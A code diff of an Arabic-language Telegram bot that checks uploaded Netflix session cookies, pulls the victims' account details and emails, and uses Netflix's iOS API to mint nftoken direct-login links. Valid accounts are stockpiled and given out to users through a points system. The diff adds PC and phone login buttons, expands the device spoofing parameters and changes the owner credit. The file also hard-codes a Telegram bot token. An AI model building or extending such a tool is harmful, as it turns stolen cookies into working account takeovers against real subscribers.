@@ -20,7 +20,7 @@ logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
 # Owner credit
-OWNER_CREDIT = "https://t.me/farxxess"
+OWNER_CREDIT = "Huy Vũ - https://huyvu2512.io.vn"
 
 # إعدادات بوت التليجرام
 BOT_TOKEN = os.environ.get('BOT_TOKEN', '8795234711:AAHQh9fufbVd63QoICaFK8rwdRzHD9V91SI')
@@ -226,13 +226,22 @@ def generate_token(netflix_id):
     url = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
     params = {
         'appVersion': "15.48.1",
-        'config': '{"gamesInTrailersEnabled":"false"}',
+        'config': '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
         'device_type': "NFAPPL-02-",
         'esn': "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
         'idiom': "phone",
         'iosVersion': "15.8.5",
+        'isTablet': "false",
+        'languages': "en-US",
+        'locale': "en-US",
+        'maxDeviceWidth': "375",
+        'model': "saget",
+        'modelType': "IPHONE8-1",
+        'odpAware': "true",
         'path': '["account","token","default"]',
         'pathFormat': "graph",
+        'pixelDensity': "2.0",
+        'progressive': "false",
         'responseFormat': "json"
     }
     headers = {
@@ -243,10 +252,15 @@ def generate_token(netflix_id):
         response = requests.get(url, params=params, headers=headers, timeout=30, verify=False)
         data = response.json()
         if "value" in data and data["value"] and "account" in data["value"]:
-            token = data["value"]["account"]["token"]["default"]["token"]
-            return {"status": "Success", "token": token, "direct_login_url": f"https://netflix.com/unsupported?nftoken={token}"}
-    except:
-        pass
+            token_data = data["value"]["account"]["token"]["default"]
+            token = token_data["token"]
+            return {
+                "status": "Success",
+                "token": token,
+                "direct_login_url": f"https://netflix.com/?nftoken={urllib.parse.quote(token, safe='')}"
+            }
+    except Exception as e:
+        logger.error(f"Error generating token: {e}")
     return {"status": "Failure"}
 
 def extract_zip_and_get_files(zip_path, extract_dir):
@@ -307,7 +321,20 @@ def callback_query(call):
         if account:
             users[str_id]["points"] -= 1
             save_users(users)
-            bot.send_message(call.message.chat.id, f"🎁 *إليك حسابك المسحوب (خصم نقطة واحدة):*\n\n{account}\n\n💰 رصيدك المتبقي: {users[str_id]['points']} نقطة", parse_mode='Markdown')
+            
+            # إرسال الحساب مع أزرار الدخول
+            markup = InlineKeyboardMarkup()
+            token_match = re.search(r'nftoken=([^\s]+)', account)
+            if token_match:
+                t_val = token_match.group(1)
+                pc_url = f"https://www.netflix.com/account?nftoken={t_val}"
+                phone_url = f"https://netflix.com/unsupported?nftoken={t_val}"
+                markup.add(
+                    InlineKeyboardButton("💻 PC Login", url=pc_url),
+                    InlineKeyboardButton("📱 Phone Login", url=phone_url)
+                )
+                
+            bot.send_message(call.message.chat.id, f"🌟 **PREMIUM ACCOUNT** 🌟\n\n{account}\n\n💰 رصيدك المتبقي: {users[str_id]['points']} نقطة", parse_mode='Markdown', reply_markup=markup if token_match else None)
         else:
             bot.send_message(call.message.chat.id, "⚠️ عذراً، ذاكرة الحسابات فارغة حالياً. انتظر حتى يتم فحص ملفات جديدة!")
             
@@ -325,7 +352,7 @@ def callback_query(call):
                 stock_count = f.read().count("="*40)
                 
         admin_text = (
-            "⚙️ *لوحة تحكم المطورين*\n\n"
+            "⚙️ **لوحة تحكم المطورين**\n\n"
             f"👥 إجمالي المستخدمين: `{total_users}`\n"
             f"📦 الحسابات المتاحة في الذاكرة: `{stock_count}` حساب\n\n"
             "▫️ لإضافة نقاط لمستخدم، أرسل الأمر بالشكل التالي:\n"
@@ -357,7 +384,7 @@ def add_points_command(message):
         save_users(users)
         bot.reply_to(message, f"✅ تمت إضافة {amount} نقطة بنجاح للمستخدم `{target_id}`.\n💰 رصيده الحالي: {users[target_id]['points']} نقطة", parse_mode='Markdown')
     else:
-        bot.reply_to(message, "❌ هذا المستخدم غير مسجل في قاعدة بيانات البوت بعد (يجب عليه الضغط على /start أولاً).")
+        bot.reply_to(message, "❌ هذا المستخدم غير مسجل في قاعدة بيانات البوت بعد.")
 
 @bot.message_handler(content_types=['document'])
 def handle_documents(message):
@@ -412,7 +439,8 @@ def handle_documents(message):
                             valid_count += 1
                             token_result = generate_token(netflix_id)
                             
-                            res_msg = "🎬 حساب NETFLIX صالح وفعال 🎬\n\n"
+                            res_msg = "🌟 PREMIUM ACCOUNT 🌟\n\n"
+                            res_msg += f"📁 المصدر: `{filename}`\n"
                             res_msg += f"🌍 البلد: `{account_info['country']}`\n"
                             res_msg += f"📦 الباقة: `{account_info['plan']}`\n"
                             res_msg += f"💰 السعر: `{account_info['plan_price']}`\n"
@@ -420,11 +448,20 @@ def handle_documents(message):
                             res_msg += f"👥 الملفات: `{account_info['profiles']}`\n"
                             res_msg += f"📧 البريد: `{account_info['email'].replace(chr(92) + 'x40', '@')}`\n"
                             
+                            markup = InlineKeyboardMarkup()
                             if token_result.get('status') == 'Success':
-                                mobile_url = token_result.get('direct_login_url', f"https://netflix.com/unsupported?nftoken={token_result['token']}")
-                                res_msg += f"\n📱 رابط الدخول المباشر:\n`{mobile_url}`"
+                                token_val = token_result['token']
+                                pc_url = f"https://www.netflix.com/account?nftoken={token_val}"
+                                phone_url = f"https://netflix.com/unsupported?nftoken={token_val}"
+                                res_msg += f"\n🔗 الرابط المباشر:\n`{phone_url}`"
+                                markup.add(
+                                    InlineKeyboardButton("💻 PC Login", url=pc_url),
+                                    InlineKeyboardButton("📱 Phone Login", url=phone_url)
+                                )
                             
-                            bot.send_message(message.chat.id, res_msg, parse_mode='Markdown')
+                            bot.send_message(message.chat.id, res_msg, parse_mode='Markdown', reply_markup=markup if token_result.get('status') == 'Success' else None)
+                            
+                            # كتابة في الملف والذاكرة
                             res_file.write(res_msg.replace('`', '') + "\n" + "="*40 + "\n")
                             save_to_stock(res_msg.replace('`', ''))
                             time.sleep(1)
@@ -446,5 +483,5 @@ def handle_documents(message):
                 pass
 
 if __name__ == '__main__':
-    logger.info("Telegram Bot with Buttons, Points & Admin Panel is running...")
+    logger.info("Telegram Bot with Direct Token Links & Login Buttons is running...")
     bot.infinity_polling()
